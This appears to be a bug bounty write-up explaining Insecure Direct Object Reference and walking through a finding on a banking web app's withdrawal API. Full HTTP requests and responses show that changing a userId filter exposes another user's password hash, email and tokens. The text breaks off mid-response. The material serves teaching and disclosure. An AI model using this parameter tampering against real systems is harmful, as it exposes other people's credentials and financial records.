---
title: IDOR Leads To Account Takeover
url: https://infosecwriteups.com/idor-leads-to-account-takeover-28fe6e300a49?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-10-07
fetch_date: 2025-10-06T18:49:55.930080
---

# IDOR Leads To Account Takeover

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F28fe6e300a49&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fidor-leads-to-account-takeover-28fe6e300a49&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fidor-leads-to-account-takeover-28fe6e300a49&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-28fe6e300a49---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-28fe6e300a49---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# IDOR Leads To Account Takeover

[![Aditya Sawant](https://miro.medium.com/v2/resize:fill:64:64/1*tPIw8IKh8vKqtSRVYOtRCA.jpeg)](https://medium.com/%40adityasawant00?source=post_page---byline--28fe6e300a49---------------------------------------)

[Aditya Sawant](https://medium.com/%40adityasawant00?source=post_page---byline--28fe6e300a49---------------------------------------)

4 min read

·

Apr 7, 2024

--

2

Listen

Share

Press enter or click to view image in full size

![]()

IDOR, one of the most common vulnerabilities in applications, can lead to major security leaks. Today, I’ll walk you through how I discovered an IDOR flaw that allowed access to other users’ accounts in the vulnerable application.

## **What is IDOR?**

Insecure Direct Object Reference (IDOR) is a security vulnerability that arises when the application exposes its internal implementation objects directly to users without proper access controls in place.

Typically, web applications or APIs use references or identifiers to access and retrieve data from their underlying storage systems. These references, if not properly protected, can be manipulated by attackers to gain unauthorized access to sensitive resources.

The vulnerability occurs when the application fails to enforce proper authorization checks before serving requested resources to users. Attackers can exploit this by manipulating parameters or identifiers in requests, thereby accessing data or functionalities they shouldn’t have access to.

For example, an attacker might change a parameter in a URL to access another user’s private files or modify data belonging to someone else. This can lead to unauthorized data disclosure, data manipulation, or even account takeover if the attacker gains access to privileged functionalities.

Press enter or click to view image in full size

![]()

image : <https://www.indusface.com/blog/owasp-api1-2019-broken-object-level-authorization/>

## Walkthrough!

**Finding IDOR Which Disclosed Sensitive Data**

While examining the target banking web application and monitoring traffic in Burp Suite, I noticed an intriguing parameter, [userId], within the body of a POST API request (/api/withdraw). Upon further investigation, I observed that the response contained hashed passwords, user emails, and other sensitive user data.

> Please note that I have modified certain data in the request and responses below for obvious reasons.

```
POST /api/withdraw HTTP/2
Host: secureapi.vulneweb.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain
Authorization: NCARGjv44HtxclcoPgCkmpiBmKRhMlEi9bQifjeEg3N38RzaMi
Content-Length: 308
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers

{"name":"withdrawalrequests","method":"GET",
"data":"filter[include][2]=withdrawalrequeststatusfilter[where][userId]=4367
&filter[order]=created DESC&filter[skip]=0&filter[limit]=10"}
```

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Vary: Origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Strict-Transport-Security: max-age=15724800; includeSubDomains

[{"amount":,"verified":,"verifiedby":,
"verifiedon":,"message":"Withdraw request",
"datetimeoftransfer":null,"bankreferenceno":null,
"transferedamount":null,"transferedtoiban":null,"approvedby":null,
"modifiedby":null,"withdrawalrequeststatusId":5,
"withdrawalservicecharge":"{\"Percentage\":2.5,\"BankPercentages\":0,\"withdrawalPercentageAdditional\":\"0\",\"withdrawalCommission\":0,\"bankPercentage\":0,\"bankAmount\":8}","generatedby":"user","withdrawaltype":null,"rejected_reason":null,"isPartnerRewardWithdrawal":false,
"userId":4367,"userbankId":,"createdby":{"id":4367,"agreement":1,"signature":".jpg","partneragreement":0,"partnersignature":null,"cellVerified":1,"createdBy":0,"modifiedBy":0,"remember_token":"","realm":"","cellnumber":"","businessPhoneNumber":"",
"password":"$2a$10$Fg9H4892x9PTlpFFuXU6YuVTzoaIsQZSwjh5N.tNDKkhce5nnFh2e",
"email":"attacker@gmail.com","emailVerified":0,"verificationToken":"",10:21:43","roleId":2,08:5
9:12","token_expiry":"","password_expiry":"","whmcs_client_id":null,"whmcs_owner_id":null}]
```

I modified the userID parameter to match the user ID of another user I possessed, which was 4597. As a result, the response included the password of that specific user. While I could have reported this vulnerability as is, I saw an opportunity to escalate its severity.

```
POST /api/withdraw HTTP/2
Host: secureapi.vulneweb.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain
Authorization: NCARGjv44HtxclcoPgCkmpiBmKRhMlEi9bQifjeEg3N38RzaMi
Content-Length: 308
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers

{"name":"withdrawalrequests","method":"GET","data":
"filter[include][2]=withdrawalrequeststatusfilter[where][userId]=4597&
filter[order]=created DESC&filter[skip]=0&filter[limit]=10filter[include][0][userbank]=bank&filter[include][1][payout]=payoutstatus&}
```

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Vary: Origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Strict-Transport-Security: max-age=15724800; includeSubDomains

[{"amount":,"verified":,"verifiedby":,"verifiedon":,"message":"Withdraw request","datetimeoftransfer":null,"bankreferenceno":null,"transferedamount":null,"transferedtoiban":null,"approvedby":null,"modifiedby":null,"withdrawalrequeststatusId":5,
,"withdrawalservicecharge":"{\"Percentage\":2.5,\"BankPercentages\":0,\"withdrawalPercentageAdditional\":\"0\",\"withdrawalCommission\":0,\"bankPercentage\":0,\"bankAmount\":8}","generatedby":"user","withdrawaltype":null,"rejected_reason":null,"isPartn...